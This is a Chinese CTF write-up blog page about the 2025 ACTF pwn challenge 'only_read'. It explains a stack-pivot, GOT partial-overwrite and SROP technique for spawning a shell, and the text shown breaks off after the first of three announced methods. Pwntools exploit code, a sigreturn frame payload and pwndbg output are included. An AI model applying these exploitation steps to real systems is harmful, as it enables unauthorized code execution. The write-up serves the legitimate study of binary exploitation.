@@ -1,0 +1,808 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":100,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
+  
+  <title>
+    only_read的三种解法 |
+    
+    Hexo
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="2025 ACTF only_read的三种解法| 0 | 前言回顾2025actf,常规glibc_ctf只有一道only_read,虽然我最后成功解出来了(偷跑),但是在看了Unauth师傅的ret2dlresolve和星盟师傅的magic_gadget利用后越来越感觉自己的手法丑陋无比,所以今天在这里将三种解法都展现出来 同时十分感谢星盟师傅教会了我如何在没有csu片段的情况下利用magic">
+<meta property="og:type" content="article">
+<meta property="og:title" content="only_read的三种解法">
+<meta property="og:url" content="https://khighl.github.io.git/2025/06/13/actf/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="2025 ACTF only_read的三种解法| 0 | 前言回顾2025actf,常规glibc_ctf只有一道only_read,虽然我最后成功解出来了(偷跑),但是在看了Unauth师傅的ret2dlresolve和星盟师傅的magic_gadget利用后越来越感觉自己的手法丑陋无比,所以今天在这里将三种解法都展现出来 同时十分感谢星盟师傅教会了我如何在没有csu片段的情况下利用magic">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://khighl.github.io.git/images/actf/1749818583226.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/actf/1749818882747.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/actf/1749820296166.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/actf/1749822468618.png">
+<meta property="og:image" content="https://khighl.github.io.git/images/actf/1749823861329.png">
+<meta property="article:published_time" content="2025-06-12T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-06-13T14:31:19.166Z">
+<meta property="article:author" content="zer00ne">
+<meta property="article:tag" content="安全">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://khighl.github.io.git/images/actf/1749818583226.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/banner.webp" alt="only_read的三种解法">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">only_read的三种解法</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2025-ACTF-only-read%E7%9A%84%E4%B8%89%E7%A7%8D%E8%A7%A3%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">2025 ACTF only_read的三种解法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">| 0 | 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">| 1 | 题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="toc-number">1.3.</span> <span class="toc-text">| 2 | 解题思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BE%AE%E9%87%8F%E5%81%8F%E7%A7%BB-SROP"><span class="toc-number">1.3.1.</span> <span class="toc-text">微量偏移+SROP</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E7%9A%84%E5%BC%80%E5%B1%80"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">常规的开局</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E5%B8%83%E7%BD%AE%E5%A4%9A%E6%9D%A1ROP%E9%93%BE"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">开始布置多条ROP链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%AD%BB%E5%B1%80"><span class="toc-number">1.3.1.3.</span> <span class="toc-text">死局?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E7%9A%84%E5%B8%8C%E6%9C%9B"><span class="toc-number">1.3.1.4.</span> <span class="toc-text">最后的希望!!!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88EXP"><span class="toc-number">1.3.1.5.</span> <span class="toc-text">最终EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Magic-gadget%E7%9A%84%E9%AB%98%E9%98%B6%E7%94%A8%E6%B3%95"><span class="toc-number">1.3.2.</span> <span class="toc-text">Magic_gadget的高阶用法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">前置知识</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B8%B8%E8%A7%84%E5%BC%80%E5%B1%80"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">常规开局</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%80%E5%A7%8B%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">开始利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E7%9A%84%E5%87%86%E5%A4%87"><span class="toc-number">1.3.2.4.</span> <span class="toc-text">参数的准备</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#gadget%E7%9A%84%E8%B0%83%E7%94%A8"><span class="toc-number">1.3.2.5.</span> <span class="toc-text">gadget的调用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E7%BB%88EXP-1"><span class="toc-number">1.3.2.6.</span> <span class="toc-text">最终EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2dlresolve"><span class="toc-number">1.3.3.</span> <span class="toc-text">ret2dlresolve</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">11</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-actf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-06-12T16:00:00.000Z" itemprop="datePublished">2025-06-13</time>
+    <time style="display: none;" id="post-update-time">2025-06-13</time>
+  </span>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="2025-ACTF-only-read的三种解法"><a href="#2025-ACTF-only-read的三种解法" class="headerlink" title="2025 ACTF only_read的三种解法"></a>2025 ACTF only_read的三种解法</h1><h2 id="0-前言"><a href="#0-前言" class="headerlink" title="| 0 | 前言"></a>| 0 | 前言</h2><p>回顾2025actf,常规glibc_ctf只有一道only_read,虽然我最后成功解出来了(偷跑),但是在看了Unauth师傅的ret2dlresolve和星盟师傅的magic_gadget利用后越来越感觉自己的手法丑陋无比,所以今天在这里将三种解法都展现出来</p>
+<p>同时十分感谢星盟师傅教会了我如何在没有csu片段的情况下利用magic_gadget重定向函数的got表</p>
+<p>题目链接:<a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/">攻防世界</a></p>
+<h2 id="1-题目分析"><a href="#1-题目分析" class="headerlink" title="| 1 | 题目分析"></a>| 1 | 题目分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/zer00ne/Desktop/ACTF/3/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x3fe000)</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>got表为<code>Partial RELRO</code>,说明我们可以将其重定向,没有<code>canary</code>和<code>PIE</code>也似乎指明了这是一道<code>栈利用</code></p>
+<p><img src="/images/actf/1749818583226.png" alt="1749818583226"></p>
+<p>用IDA打开后可以看到<code>main</code>函数十分简洁,我们有着很长的溢出长度(<code>0x778</code>字节),但是可以利用的函数只有<code>read</code>函数</p>
+<p>而且elf文件中没有<code>init</code>函数,说明我们无法使用<code>ret2csu</code>进行任意参数的填充</p>
+<h2 id="2-解题思路"><a href="#2-解题思路" class="headerlink" title="| 2 | 解题思路"></a>| 2 | 解题思路</h2><h3 id="微量偏移-SROP"><a href="#微量偏移-SROP" class="headerlink" title="微量偏移+SROP"></a>微量偏移+SROP</h3><h4 id="常规的开局"><a href="#常规的开局" class="headerlink" title="常规的开局"></a>常规的开局</h4><p>这是我的打法,集合和许多巧合和偶然性才打通的</p>
+<p><img src="/images/actf/1749818882747.png" alt="1749818882747"></p>
+<p>通过gdb我们可以发现,在<code>read</code>函数开头的附近有个<code>syscall</code>,如果<code>read</code>的got表中被我们修改为<code>syscall</code>,我们就可以做更多事情</p>
+<p>修改的方法也很简单,就是使用通过栈迁移,将<code>main</code>函数中<code>read</code>的二参修改到<code>read</code>的<code>got</code>表上,并将<code>低8字节</code>覆盖为<code>0x5f</code>(此所谓微量偏移),此时<code>read.got-&gt;syscal</code>l,而且如果我们可以在r<code>ead.got</code>的高地址处提前布置好ROP链,我们就可以继续控制执行流</p>
+<p>同时这也是这个手法的难点:我们布置的<code>ROP</code>并不是布置完就执行,而是错位的(布置好第三条链子后才开始执行第二条链子)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io=remote(&quot;1.95.199.251&quot;,9999)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">con</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Submit the token generated by `&quot;</span>)</span><br><span class="line">    key=io.recvuntil(<span class="string">b&quot;`&quot;</span>)[:-<span class="number">1</span>]</span><br><span class="line">    token = os.popen(key.decode()).read().strip().encode()</span><br><span class="line">    io.sendline(token)</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;Here is your challenge~&quot;</span>)</span><br><span class="line"><span class="comment">#con()</span></span><br><span class="line">bss=<span class="number">0x404800</span></span><br><span class="line">got=<span class="number">0x404000</span><span class="comment">#--&gt;0x5f</span></span><br><span class="line">read=<span class="number">0x401142</span></span><br><span class="line">leave=<span class="number">0x40115D</span></span><br><span class="line">tar=<span class="number">0x404088</span></span><br><span class="line">t2=<span class="number">0x404880</span></span><br><span class="line">t3=<span class="number">0x404888</span></span><br><span class="line">eax=<span class="number">0x401158</span></span><br><span class="line">rbp=<span class="number">0x40111D</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="开始布置多条ROP链"><a href="#开始布置多条ROP链" class="headerlink" title="开始布置多条ROP链"></a>开始布置多条ROP链</h4><p>首先我们将需要使用的地址和gadget先列出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x80</span>+p64(tar+<span class="number">0x80</span>-<span class="number">0x8</span>)+p64(read)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p>第一步肯定是栈迁移,为什么要把<code>rbp</code>迁移到这个位置呢?</p>
+<p>因为迁移后调用<code>read</code>时,<code>read</code>的二参刚刚好<code>got+0x80</code>,也就是为我们对<code>got </code>进行微量偏移后的执行流控制做准备</p>
+<p>我们此时把<code>ROP</code>链发送过去</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(bss+<span class="number">0x100</span>-<span class="number">0x88</span>)+p64(leave) <span class="comment">#here</span></span><br><span class="line">payload=payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(bss-<span class="number">0x100</span>)+p64(read)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p>我们将<code>rbp</code>移动到<code>bss-0x100</code>的位置,调用<code>read</code>继续布置ROP链,留意这里的<code>read+4</code>的布置,后面会回来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s=SigreturnFrame()</span><br><span class="line">bin_sh=<span class="number">0x404718</span></span><br><span class="line">s.rax=<span class="number">0x3b</span></span><br><span class="line">s.rdi=bin_sh</span><br><span class="line">s.rdx=<span class="number">0</span></span><br><span class="line">s.rsi=<span class="number">0</span></span><br><span class="line">s.rip=<span class="number">0x401044</span></span><br><span class="line">payload =p64(bss).ljust(<span class="number">0x80</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(got+<span class="number">0x80</span>)+p64(read)+p64(leave)</span><br><span class="line">payload+=<span class="string">b&quot;/bin/sh\x00&quot;</span>+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x160</span>+p64(rbp)+p64(<span class="number">0xf</span>+<span class="number">0x80</span>)+p64(read)+<span class="built_in">bytes</span>(s)[<span class="number">8</span>:]</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure>
+
+<p>提前将<code>SROP</code>的<code>Frame</code>和<code>/bin/sh</code>写好,并放在特定的位置(这个位置都是一步一步调试出来的,一次性肯定写不出来)</p>
+<p>然后再次使用栈迁移,同时调用<code>read</code>时,此时<code>read</code>的<code>rsi</code>为<code>got</code>,并在这条<code>ROP</code>上将<code>leave</code>布置好,准备将后续的执行流控制</p>
+<h4 id="死局"><a href="#死局" class="headerlink" title="死局?"></a>死局?</h4><p>回到此刻的<code>RIP</code>,看到调用<code>read</code>改变<code>got</code>后,<code>rsi</code>被钉在了<code>got</code>地址上,此时我们是无法进行<code>SROP</code>的</p>
+<p><img src="/images/actf/1749820296166.png" alt="1749820296166"></p>
+<p>我们需要将<code>rsi</code>迁移到其他地方,而<code>rsi</code>是根据<code>rbp</code>决定的,可是此时我们已经无法调用read来随意<code>栈迁移</code>了</p>
+<p>更糟糕的是,因为<code>rax</code>被用来间接传参,我们甚至没法使用<code>read_syscall</code>,似乎这里我们进入了<strong>死局</strong></p>
+<h4 id="最后的希望"><a href="#最后的希望" class="headerlink" title="最后的希望!!!"></a>最后的希望!!!</h4><p>我们观察此时的<code>rbp</code>,它被我们设置为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0x0000000000401158 in main ()</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">───────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────</span><br><span class="line">*RAX  1</span><br><span class="line"> RBX  0x7fffffffdeb8 —▸ 0x7fffffffe238 ◂— 0x4853006e77702f2e /* &#x27;./pwn&#x27; */</span><br><span class="line"> RCX  0x7ffff7d1ba61 (read+17) ◂— cmp rax, -0x1000 /* &#x27;H=&#x27; */</span><br><span class="line"> RDX  0x800</span><br><span class="line"> RDI  0</span><br><span class="line"> RSI  0x404000 (read@got[plt]) —▸ 0x7ffff7d1ba5f (read+15) ◂— syscall </span><br><span class="line"> R8   0</span><br><span class="line"> R9   0x7ffff7fca380 ◂— endbr64 </span><br><span class="line"> R10  0x7ffff7c109d8 ◂— 0x11001200001bd3</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  1</span><br><span class="line"> R13  0</span><br><span class="line"> R14  0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401100 (__do_global_dtors_aux) ◂— endbr64 </span><br><span class="line"> R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0</span><br><span class="line"> RBP  0x404080 —▸ 0x404878 ◂— 0</span><br><span class="line"> RSP  0x404710 —▸ 0x40115d (main+39) ◂— leave </span><br><span class="line">*RIP  0x401158 (main+34) ◂— mov eax, 0</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   0x401142 &lt;main+12&gt;                     lea    rax, [rbp - 0x80]     RAX =&gt; 0x404000 (read@got[plt]) —▸ 0x7ffff7d1ba50 (read) ◂— endbr64 </span><br><span class="line">   0x401146 &lt;main+16&gt;                     mov    edx, 0x800            EDX =&gt; 0x800</span><br><span class="line">   0x40114b &lt;main+21&gt;                     mov    rsi, rax              RSI =&gt; 0x404000 (read@got[plt]) —▸ 0x7ffff7d1ba50 (read) ◂— endbr64 </span><br><span class="line">   0x40114e &lt;main+24&gt;                     mov    edi, 0                EDI =&gt; 0</span><br><span class="line">   0x401153 &lt;main+29&gt;                     call   0x401040                    &lt;0x401040&gt;</span><br><span class="line"> </span><br><span class="line"> ► 0x401158 &lt;main+34&gt;                     mov    eax, 0                EAX =&gt; 0</span><br><span class="line">   0x40115d &lt;main+39&gt;                     leave  </span><br><span class="line">   0x40115e &lt;main+40&gt;                     ret                                &lt;main+39&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x40115d &lt;main+39&gt;                     leave  </span><br><span class="line">   0x40115e &lt;main+40&gt;                     ret                                &lt;__do_global_dtors_aux+29&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x40111d &lt;__do_global_dtors_aux+29&gt;    pop    rbp                   RBP =&gt; 143</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp 0x404710 —▸ 0x40115d (main+39) ◂— leave </span><br><span class="line">01:0008│+698 0x404718 ◂— 0x68732f6e69622f /* &#x27;/bin/sh&#x27; */</span><br><span class="line">02:0010│+6a0 0x404720 ◂— 0</span><br><span class="line">... ↓        5 skipped</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0         0x401158 main+34</span><br><span class="line">   1         0x40115d main+39</span><br><span class="line">   2         0x40111d __do_global_dtors_aux+29</span><br><span class="line">   3             0x8f None</span><br><span class="line">   4         0x401142 main+12</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>此时如果我们进行一步<code>leave;ret</code>,就可以将<code>rsp</code>移动到<code>0x404878+8</code>的位置</p>
+<p>如果我们可以将<code>SigreturnFrame</code>提前写到这个位置,然后:</p>
+<ul>
+<li>通过<code>pop rbp;ret</code>将<code>rbp</code>设置为<code>0xf+0x80</code>,这样间接引用<code>rax</code>传参时,<code>rax</code>就会变成<code>0xf</code></li>
+<li>将<code>read.plt</code>接在末尾,此时便会执行<code>Sigreturn</code>,而我们已经设置好<code>Frame</code></li>
+</ul>
+<p>我们就可以执行<code>execve(&quot;/bin/sh&quot;,0,0)</code>,成功<code>getshell!!!!</code></p>
